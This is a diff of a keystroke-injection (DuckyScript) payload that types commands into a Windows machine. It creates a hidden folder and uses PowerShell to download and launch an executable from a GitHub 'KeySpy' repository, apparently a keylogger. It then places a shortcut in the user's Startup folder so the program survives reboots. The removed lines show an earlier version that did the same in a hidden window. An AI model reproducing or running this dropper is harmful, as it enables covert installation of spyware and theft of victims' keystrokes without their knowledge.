@@ -6,20 +6,40 @@ DELAY 500
 STRING cmd
 DELAY 500
 ENTER
-DELAY 1000
-STRING cd C:\Program Files (x86)
+DELAY 500
+STRING mkdir C:\winx32
 DELAY 500
 ENTER
 DELAY 500
-STRING mkdir winx32
+STRING exit
 DELAY 500
 ENTER
 DELAY 1000
-STRING powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/src/gl0bal/kSpy.exe', 'C:\Program Files (x86)\winx32\kSpy.exe'); Start-Process 'C:\Program Files (x86)\winx32\kSpy.exe' -WindowStyle Hidden -Priority High"
+GUI r
+DELAY 500
+STRING powershell
 DELAY 500
 ENTER
 DELAY 1000
-ALT SPACE
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/exe/kSpy-AIO_v1.2.exe', 'C:\winx32\kSpy-AIO_v1.2.exe')
 DELAY 500
-STRING c
+ENTER
+DELAY 5000
+STRING Start-Process 'C:\winx32\kSpy-AIO_v1.2.exe'
 DELAY 500
+ENTER
+DELAY 10000
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/exe/.lnk/kSpy-AIO_v1.2-Srt.lnk', 'C:\winx32\kSpy-AIO_v1.2-Srt.lnk')
+DELAY 500
+ENTER
+DELAY 1000
+STRING move-item -Path 'C:\winx32\kSpy-AIO_v1.2-Srt.lnk' -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kSpy-AIO_v1.2-Srt.lnk"
+DELAY 500
+ENTER
+DELAY 1000
+STRING explorer "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+DELAY 500
+ENTER
+DELAY 1000
+ALT F4
+
